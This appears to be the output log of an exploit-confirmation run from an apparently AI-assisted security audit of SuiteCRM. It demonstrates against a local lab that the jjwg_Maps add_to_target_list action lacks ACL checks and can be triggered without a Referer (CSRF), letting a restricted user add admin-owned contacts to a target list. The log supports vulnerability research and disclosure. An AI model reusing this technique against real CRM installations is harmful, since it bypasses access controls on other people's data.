@@ -1,0 +1,25 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-051/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-051/../.venv
+========================================================================
+VULN-051: jjwg_Maps add_to_target_list: no-ACL add-to-list + CSRF
+target: http://localhost:33116
+========================================================================
+[INFO] sink: modules/jjwg_Maps/controller.php:320-394 (is_guid-only validation, no ACL)
+[SETUP] admin web + legacy REST session
+[SETUP] create low-priv RegularUser L, deny Contacts view/list ACL
+[OK] low-priv user mod_6da333e7 id=0d2f6050-5e68-468f-99c1-68367c629878, role d038a579-1229-4e1c-8d3e-5a0f76ac3c72 denies Contacts view/list
+[SETUP] admin creates two Contacts assigned to admin (L cannot view either)
+[OK] C1=6771aa54-f572-484a-8f63-7aad7bfcbb81 (Mtgt1_e7086449), C2=2a52115c-db15-44e3-811f-2e1c6b324773 (Mtgt2_38df5b5b)
+[SETUP] L creates own ProspectList PL
+[OK] PL=ea3c4b69-c196-4405-9a7e-cff7642bff7f owned by L
+[STEP] add_to_target_list display_module=Contacts selected_ids=C1 (with Referer)
+[INFO] response(a): 200 '{"message":"Target List Updated","list":{"name":"Contact"}}<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SHORTCUT ICON" href="themes/SuiteP/images/sugar_icon.ico?v=p-BUXW88kPGyJ3qvsiY4dw">'
+[STEP] add_to_target_list display_module=Contacts selected_ids=C2 (NO Referer)
+[INFO] response(b, no-Referer): 200 '{"message":"Target List Updated","list":{"name":"Contact"}}<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SHORTCUT ICON" href="themes/SuiteP/images/sugar_icon.ico?v=p-BUXW88kPGyJ3qvsiY4dw">'
+[STEP] add_to_target_list display_module=Users selected_ids=<admin id> (checking the 'incl. Users' sub-claim against this lab's actual config)
+[INFO] response(c, Users): 200 '{"message":"Target List NOT Updated","list":{"name":null}}<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SHORTCUT ICON" href="themes/SuiteP/images/sugar_icon.ico?v=p-BUXW88kPGyJ3qvsiY4dw">\n'
+[INFO] Users-add actually created a row: False (expected False in this lab -- 'Users' is not in jjwg_Maps' default valid_geocode_modules, so $this->display_object never gets set for display_module=Users and the whole guard at controller.php:353 is false)
+[STEP] db-verify prospect_lists_prospects rows for C1 and C2 under PL
+[PROOF] prospect_lists_prospects rows: [{'related_id': '2a52115c-db15-44e3-811f-2e1c6b324773', 'related_type': 'Contacts'}, {'related_id': '6771aa54-f572-484a-8f63-7aad7bfcbb81', 'related_type': 'Contacts'}]
+[OK] L (denied Contacts view/list ACL) added both admin-owned Contacts to PL=ea3c4b69-c196-4405-9a7e-cff7642bff7f via jjwg_Maps add_to_target_list; C2 used zero Referer (CSRF-reachable). Users sub-claim: NOT reachable in this lab default config (documented above/in notes.md)
+==> VULN-051: CONFIRMED — format-only-validated add-to-list bypasses ACL for C1=6771aa54.. and C2=2a52115c.. (no-Referer); Users sub-claim config-gated here (see notes.md)
